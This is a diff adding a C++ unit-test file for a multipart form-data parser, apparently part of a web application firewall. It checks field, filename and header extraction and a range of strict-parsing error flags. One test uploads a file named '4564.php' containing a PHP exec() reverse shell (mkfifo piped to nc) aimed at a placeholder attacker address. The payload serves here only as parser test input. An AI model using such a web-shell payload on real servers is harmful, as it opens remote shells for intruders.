@@ -1,0 +1,662 @@
+/**
+ * Copyright (c) 2024-2025 Stone Rhino and contributors.
+ *
+ * MIT License (http://opensource.org/licenses/MIT)
+ *
+ * Permission is hereby granted, free of charge, to any person obtaining a copy of this software and
+ * associated documentation files (the "Software"), to deal in the Software without restriction,
+ * including without limitation the rights to use, copy, modify, merge, publish, distribute,
+ * sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is
+ * furnished to do so, subject to the following conditions:
+ *
+ * The above copyright notice and this permission notice shall be included in all copies or
+ * substantial portions of the Software.
+ *
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT
+ * NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
+ * NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
+ * DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+ * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+ */
+#include <gtest/gtest.h>
+
+#include "common/ragel/multi_part.h"
+
+TEST(Common, multiPart) {
+  Wge::Common::Ragel::MultiPart multi_part;
+  multi_part.init(R"(multipart/form-data; boundary=--helloworld)",
+                  "----helloworld\r\n"
+                  "content-disposition: form-data; name=foo1\r\n"
+                  "header1: value1\r\n"
+                  "\r\n"
+                  "bar1\r\n"
+                  "----helloworld\r\n"
+                  "content-disposition: form-data; name=foo2\r\n"
+                  "header2: value2\r\n"
+                  "\r\n"
+                  "bar2\r\n"
+                  "----helloworld\r\n"
+                  "content-disposition: form-data; name=foo3\r\n"
+                  "header2: value3\r\n"
+                  "\r\n"
+                  "bar3\r\n"
+                  "----helloworld\r\n"
+                  "content-disposition: form-data; name=file1; filename=hello1\r\n"
+                  "\r\n"
+                  "world\r\n"
+                  "----helloworld\r\n"
+                  "content-disposition: form-data; name=file2; filename=hello2\r\n"
+                  "\r\n"
+                  "world\r\n"
+                  "----helloworld\r\n"
+                  "content-disposition: form-data; name=file3; filename=hello3\r\n"
+                  "\r\n"
+                  "world\r\n"
+                  "----helloworld--",
+                  3);
+  auto error = multi_part.getError();
+  EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+  auto& name_value_map = multi_part.getNameValue();
+  auto& name_value_linked = multi_part.getNameValueLinked();
+  EXPECT_EQ(name_value_map.size(), 3);
+  EXPECT_EQ(name_value_linked.size(), 3);
+  EXPECT_EQ(name_value_map.find("foo1")->second, "bar1\r\n");
+  EXPECT_EQ(name_value_map.find("foo2")->second, "bar2\r\n");
+  EXPECT_EQ(name_value_map.find("foo3")->second, "bar3\r\n");
+  EXPECT_EQ(name_value_linked[0].first, "foo1");
+  EXPECT_EQ(name_value_linked[1].first, "foo2");
+  EXPECT_EQ(name_value_linked[2].first, "foo3");
+  EXPECT_EQ(name_value_linked[0].second, "bar1\r\n");
+  EXPECT_EQ(name_value_linked[1].second, "bar2\r\n");
+  EXPECT_EQ(name_value_linked[2].second, "bar3\r\n");
+
+  auto& name_filename_map = multi_part.getNameFileName();
+  auto& name_filename_linked = multi_part.getNameFileNameLinked();
+  EXPECT_EQ(name_filename_map.size(), 3);
+  EXPECT_EQ(name_filename_linked.size(), 3);
+  EXPECT_EQ(name_filename_map.find("file1")->second, "hello1");
+  EXPECT_EQ(name_filename_map.find("file2")->second, "hello2");
+  EXPECT_EQ(name_filename_map.find("file3")->second, "hello3");
+  EXPECT_EQ(name_filename_linked[0].first, "file1");
+  EXPECT_EQ(name_filename_linked[1].first, "file2");
+  EXPECT_EQ(name_filename_linked[2].first, "file3");
+  EXPECT_EQ(name_filename_linked[0].second, "hello1");
+  EXPECT_EQ(name_filename_linked[1].second, "hello2");
+  EXPECT_EQ(name_filename_linked[2].second, "hello3");
+
+  auto& headers_map = multi_part.getHeaders();
+  auto& headers_linked = multi_part.getHeadersLinked();
+  EXPECT_EQ(headers_map.size(), 3);
+  EXPECT_EQ(headers_linked.size(), 3);
+  EXPECT_EQ(headers_map.find("header1")->second, "header1: value1");
+  auto iter_range = headers_map.equal_range("header2");
+  int count = 0;
+  for (auto iter = iter_range.first; iter != iter_range.second; ++iter) {
+    EXPECT_TRUE(iter->second == "header2: value2" || iter->second == "header2: value3");
+    ++count;
+  }
+  EXPECT_EQ(count, 2);
+  EXPECT_EQ(headers_linked[0].first, "header1");
+  EXPECT_EQ(headers_linked[1].first, "header2");
+  EXPECT_EQ(headers_linked[2].first, "header2");
+  EXPECT_EQ(headers_linked[0].second, "header1: value1");
+  EXPECT_EQ(headers_linked[1].second, "header2: value2");
+  EXPECT_EQ(headers_linked[2].second, "header2: value3");
+}
+
+TEST(Common, multiPartBoundaryNameNoHyphen) {
+  Wge::Common::Ragel::MultiPart multi_part;
+  multi_part.init(R"(multipart/form-data; boundary=4bsbcsb)",
+                  R"(--4bsbcsb
+Content-Disposition: form-data; name="upload"
+
+sdbdb
+--4bsbcsb
+Content-Disposition: form-data; name="per_file"; filename="4564.php"
+Content-Type: application/x-php
+
+<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {random_attacker_ip} {random_attacker_port} >/tmp/f"); ?>
+--4bsbcsb--)",
+                  3);
+  auto error = multi_part.getError();
+  EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+  auto& name_value_map = multi_part.getNameValue();
+  auto& name_value_linked = multi_part.getNameValueLinked();
+  EXPECT_EQ(name_value_map.size(), 1);
+  EXPECT_EQ(name_value_linked.size(), 1);
+  EXPECT_EQ(name_value_map.find("upload")->second, "sdbdb\n");
+  EXPECT_EQ(name_value_linked[0].first, "upload");
+  EXPECT_EQ(name_value_linked[0].second, "sdbdb\n");
+
+  auto& name_filename_map = multi_part.getNameFileName();
+  auto& name_filename_linked = multi_part.getNameFileNameLinked();
+  EXPECT_EQ(name_filename_map.size(), 1);
+  EXPECT_EQ(name_filename_linked.size(), 1);
+  EXPECT_EQ(name_filename_map.find("per_file")->second, "4564.php");
+  EXPECT_EQ(name_filename_linked[0].first, "per_file");
+  EXPECT_EQ(name_filename_linked[0].second, "4564.php");
+}
+
+TEST(Common, multiPartError) {
+  // ErrorType::BoundaryQuoted
+  {
+    Wge::Common::Ragel::MultiPart multi_part;
+    multi_part.init(R"(multipart/form-data; boundary="--helloworld")",
+                    R"(--"--helloworld")"
+                    "\r\n"
+                    "content-disposition: form-data; name=foo1\r\n"
+                    "header1: value1\r\n"
+                    "\r\n"
+                    "bar1\r\n"
+                    R"(--"--helloworld"--)");
+    auto error = multi_part.getError();
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::ReqbodyProcessorError));
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryQuoted));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryWhitespace));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataBefore));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataAfter));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::HeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::LfLine));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MissingSemicolon));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidQuoting));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidPart));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidHeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::FileLimitExceeded));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::UnmatchedBoundary));
+
+    auto& name_value_map = multi_part.getNameValue();
+    auto& name_value_linked = multi_part.getNameValueLinked();
+    EXPECT_EQ(name_value_map.size(), 1);
+    EXPECT_EQ(name_value_linked.size(), 1);
+    EXPECT_EQ(name_value_map.find("foo1")->second, "bar1\r\n");
+    EXPECT_EQ(name_value_linked[0].first, "foo1");
+    EXPECT_EQ(name_value_linked[0].second, "bar1\r\n");
+  }
+
+  // ErrorType::BoundaryWhitespace
+  {
+    Wge::Common::Ragel::MultiPart multi_part;
+    multi_part.init(R"(multipart/form-data; boundary=--hello world)",
+                    R"(----hello world)"
+                    "\r\n"
+                    "content-disposition: form-data; name=foo1\r\n"
+                    "header1: value1\r\n"
+                    "\r\n"
+                    "bar1\r\n"
+                    R"(----hello world--)");
+    auto error = multi_part.getError();
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::ReqbodyProcessorError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryQuoted));
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryWhitespace));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataBefore));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataAfter));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::HeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::LfLine));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MissingSemicolon));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidQuoting));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidPart));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidHeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::FileLimitExceeded));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::UnmatchedBoundary));
+
+    auto& name_value_map = multi_part.getNameValue();
+    auto& name_value_linked = multi_part.getNameValueLinked();
+    EXPECT_EQ(name_value_map.size(), 1);
+    EXPECT_EQ(name_value_linked.size(), 1);
+    EXPECT_EQ(name_value_map.find("foo1")->second, "bar1\r\n");
+    EXPECT_EQ(name_value_linked[0].first, "foo1");
+    EXPECT_EQ(name_value_linked[0].second, "bar1\r\n");
+  }
+
+  // ErrorType::DataBefore
+  {
+    Wge::Common::Ragel::MultiPart multi_part;
+    multi_part.init(R"(multipart/form-data; boundary=--helloworld)",
+                    R"(asdf----helloworld)"
+                    "\r\n"
+                    "content-disposition: form-data; name=foo1\r\n"
+                    "header1: value1\r\n"
+                    "\r\n"
+                    "bar1\r\n"
+                    R"(----helloworld--)");
+    auto error = multi_part.getError();
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::ReqbodyProcessorError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryQuoted));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryWhitespace));
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::DataBefore));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataAfter));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::HeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::LfLine));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MissingSemicolon));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidQuoting));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidPart));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidHeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::FileLimitExceeded));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::UnmatchedBoundary));
+
+    auto& name_value_map = multi_part.getNameValue();
+    auto& name_value_linked = multi_part.getNameValueLinked();
+    EXPECT_EQ(name_value_map.size(), 1);
+    EXPECT_EQ(name_value_linked.size(), 1);
+    EXPECT_EQ(name_value_map.find("foo1")->second, "bar1\r\n");
+    EXPECT_EQ(name_value_linked[0].first, "foo1");
+    EXPECT_EQ(name_value_linked[0].second, "bar1\r\n");
+  }
+
+  // ErrorType::DataAfter
+  {
+    Wge::Common::Ragel::MultiPart multi_part;
+    multi_part.init(R"(multipart/form-data; boundary=--helloworld)",
+                    R"(----helloworld)"
+                    "\r\n"
+                    "content-disposition: form-data; name=foo1\r\n"
+                    "header1: value1\r\n"
+                    "\r\n"
+                    "bar1\r\n"
+                    R"(----helloworld--asdf)");
+    auto error = multi_part.getError();
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::ReqbodyProcessorError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryQuoted));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryWhitespace));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataBefore));
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::DataAfter));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::HeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::LfLine));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MissingSemicolon));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidQuoting));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidPart));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidHeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::FileLimitExceeded));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::UnmatchedBoundary));
+
+    auto& name_value_map = multi_part.getNameValue();
+    auto& name_value_linked = multi_part.getNameValueLinked();
+    EXPECT_EQ(name_value_map.size(), 1);
+    EXPECT_EQ(name_value_linked.size(), 1);
+    EXPECT_EQ(name_value_map.find("foo1")->second, "bar1\r\n");
+    EXPECT_EQ(name_value_linked[0].first, "foo1");
+    EXPECT_EQ(name_value_linked[0].second, "bar1\r\n");
+  }
+
+  // ErrorType::HeaderFolding
+  {
+    Wge::Common::Ragel::MultiPart multi_part;
+    multi_part.init(R"(multipart/form-data; boundary=--helloworld)",
+                    R"(----helloworld)"
+                    "\r\n"
+                    "content-disposition: form-data; name=foo1\r\n"
+                    " header1: value1\r\n"
+                    "\r\n"
+                    "bar1\r\n"
+                    R"(----helloworld--)");
+    auto error = multi_part.getError();
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::ReqbodyProcessorError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryQuoted));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryWhitespace));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataBefore));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataAfter));
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::HeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::LfLine));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MissingSemicolon));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidQuoting));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidPart));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidHeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::FileLimitExceeded));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::UnmatchedBoundary));
+
+    auto& name_value_map = multi_part.getNameValue();
+    auto& name_value_linked = multi_part.getNameValueLinked();
+    EXPECT_EQ(name_value_map.size(), 1);
+    EXPECT_EQ(name_value_linked.size(), 1);
+    EXPECT_EQ(name_value_map.find("foo1")->second, "bar1\r\n");
+    EXPECT_EQ(name_value_linked[0].first, "foo1");
+    EXPECT_EQ(name_value_linked[0].second, "bar1\r\n");
+  }
+
+  // ErrorType::LfLine
+  // {
+  //   Wge::Common::Ragel::MultiPart multi_part;
+  //   multi_part.init(R"(multipart/form-data; boundary=--helloworld)",
+  //                   "----helloworld\n"
+  //                   "content-disposition: form-data; name=\"hello\"\r\n"
+  //                   "\r\n"
+  //                   "world\r\n"
+  //                   "----helloworld--");
+  //   auto error = multi_part.getError();
+  //   EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+  //   EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::ReqbodyProcessorError));
+  //   EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryQuoted));
+  //   EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryWhitespace));
+  //   EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataBefore));
+  //   EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataAfter));
+  //   EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::HeaderFolding));
+  //   EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::LfLine));
+  //   EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MissingSemicolon));
+  //   EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidQuoting));
+  //   EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidPart));
+  //   EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidHeaderFolding));
+  //   EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::FileLimitExceeded));
+  //   EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::UnmatchedBoundary));
+  // }
+
+  // ErrorType::MissingSemicolon
+  {
+    Wge::Common::Ragel::MultiPart multi_part;
+    multi_part.init(R"(multipart/form-data; boundary=--helloworld)",
+                    R"(----helloworld)"
+                    "\r\n"
+                    "content-disposition: form-data name=foo1\r\n"
+                    "header1: value1\r\n"
+                    "\r\n"
+                    "bar1\r\n"
+                    R"(----helloworld--)");
+    auto error = multi_part.getError();
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::ReqbodyProcessorError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryQuoted));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryWhitespace));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataBefore));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataAfter));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::HeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::LfLine));
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MissingSemicolon));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidQuoting));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidPart));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidHeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::FileLimitExceeded));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::UnmatchedBoundary));
+
+    auto& name_value_map = multi_part.getNameValue();
+    auto& name_value_linked = multi_part.getNameValueLinked();
+    EXPECT_EQ(name_value_map.size(), 1);
+    EXPECT_EQ(name_value_linked.size(), 1);
+    EXPECT_EQ(name_value_map.find("foo1")->second, "bar1\r\n");
+    EXPECT_EQ(name_value_linked[0].first, "foo1");
+    EXPECT_EQ(name_value_linked[0].second, "bar1\r\n");
+  }
+
+  // ErrorType::InvalidQuoting
+  {
+    Wge::Common::Ragel::MultiPart multi_part;
+    multi_part.init(R"(multipart/form-data; boundary=--helloworld)",
+                    R"(----helloworld)"
+                    "\r\n"
+                    "content-disposition: form-data; name=\"foo1\r\n"
+                    "header1: value1\r\n"
+                    "\r\n"
+                    "bar1\r\n"
+                    R"(----helloworld--)");
+    auto error = multi_part.getError();
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::ReqbodyProcessorError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryQuoted));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryWhitespace));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataBefore));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataAfter));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::HeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::LfLine));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MissingSemicolon));
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::InvalidQuoting));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidPart));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidHeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::FileLimitExceeded));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::UnmatchedBoundary));
+
+    auto& name_value_map = multi_part.getNameValue();
+    auto& name_value_linked = multi_part.getNameValueLinked();
+    EXPECT_EQ(name_value_map.size(), 1);
+    EXPECT_EQ(name_value_linked.size(), 1);
+    EXPECT_EQ(name_value_map.find("foo1")->second, "bar1\r\n");
+    EXPECT_EQ(name_value_linked[0].first, "foo1");
+    EXPECT_EQ(name_value_linked[0].second, "bar1\r\n");
+  }
+
+  // ErrorType::InvalidQuoting
+  {
+    Wge::Common::Ragel::MultiPart multi_part;
+    multi_part.init(R"(multipart/form-data; boundary=--helloworld)",
+                    R"(----helloworld)"
+                    "\r\n"
+                    "content-disposition: form-data; name=foo1\"\r\n"
+                    "header1: value1\r\n"
+                    "\r\n"
+                    "bar1\r\n"
+                    R"(----helloworld--)");
+    auto error = multi_part.getError();
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::ReqbodyProcessorError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryQuoted));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryWhitespace));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataBefore));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataAfter));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::HeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::LfLine));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MissingSemicolon));
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::InvalidQuoting));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidPart));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidHeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::FileLimitExceeded));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::UnmatchedBoundary));
+
+    auto& name_value_map = multi_part.getNameValue();
+    auto& name_value_linked = multi_part.getNameValueLinked();
+    EXPECT_EQ(name_value_map.size(), 1);
+    EXPECT_EQ(name_value_linked.size(), 1);
+    EXPECT_EQ(name_value_map.find("foo1")->second, "bar1\r\n");
+    EXPECT_EQ(name_value_linked[0].first, "foo1");
+    EXPECT_EQ(name_value_linked[0].second, "bar1\r\n");
+  }
+
+  // ErrorType::InvalidQuoting
+  {
+    Wge::Common::Ragel::MultiPart multi_part;
+    multi_part.init(R"(multipart/form-data; boundary=--helloworld)",
+                    R"(----helloworld)"
+                    "\r\n"
+                    "content-disposition: form-data; name=fo\"o1\r\n"
+                    "header1: value1\r\n"
+                    "\r\n"
+                    "bar1\r\n"
+                    R"(----helloworld--)");
+    auto error = multi_part.getError();
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::ReqbodyProcessorError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryQuoted));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryWhitespace));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataBefore));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataAfter));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::HeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::LfLine));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MissingSemicolon));
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::InvalidQuoting));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidPart));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidHeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::FileLimitExceeded));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::UnmatchedBoundary));
+
+    auto& name_value_map = multi_part.getNameValue();
+    auto& name_value_linked = multi_part.getNameValueLinked();
+    EXPECT_EQ(name_value_map.size(), 1);
+    EXPECT_EQ(name_value_linked.size(), 1);
+    EXPECT_EQ(name_value_map.find("fo\"o1")->second, "bar1\r\n");
+    EXPECT_EQ(name_value_linked[0].first, "fo\"o1");
+    EXPECT_EQ(name_value_linked[0].second, "bar1\r\n");
+  }
+
+  // ErrorType::InvalidPart
+  {
+    Wge::Common::Ragel::MultiPart multi_part;
+    multi_part.init(R"(multipart/form-data; boundary=--helloworld)",
+                    R"(----helloworld)"
+                    "\r\n"
+                    "content-disposition: form-data; name=foo1\r\n"
+                    R"(----helloworld)"
+                    "\r\n"
+                    "content-disposition: form-data; name=foo1\r\n"
+                    "header1: value1\r\n"
+                    "\r\n"
+                    "bar1\r\n"
+                    R"(----helloworld--)");
+    auto error = multi_part.getError();
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::ReqbodyProcessorError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryQuoted));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryWhitespace));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataBefore));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataAfter));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::HeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::LfLine));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MissingSemicolon));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidQuoting));
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::InvalidPart));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidHeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::FileLimitExceeded));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::UnmatchedBoundary));
+
+    auto& name_value_map = multi_part.getNameValue();
+    auto& name_value_linked = multi_part.getNameValueLinked();
+    EXPECT_EQ(name_value_map.size(), 1);
+    EXPECT_EQ(name_value_linked.size(), 1);
+    EXPECT_EQ(name_value_map.find("foo1")->second, "bar1\r\n");
+    EXPECT_EQ(name_value_linked[0].first, "foo1");
+    EXPECT_EQ(name_value_linked[0].second, "bar1\r\n");
+  }
+
+  // ErrorType::InvalidPart
+  {
+    Wge::Common::Ragel::MultiPart multi_part;
+    multi_part.init(R"(multipart/form-data; boundary=--helloworld)",
+                    R"(----helloworld)"
+                    "\r\n"
+                    "content-disposition: form-data; name=foo1\r\n"
+                    "header1: value1\r\n"
+                    "\r\n"
+                    "bar1\r\n");
+    auto error = multi_part.getError();
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::ReqbodyProcessorError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryQuoted));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryWhitespace));
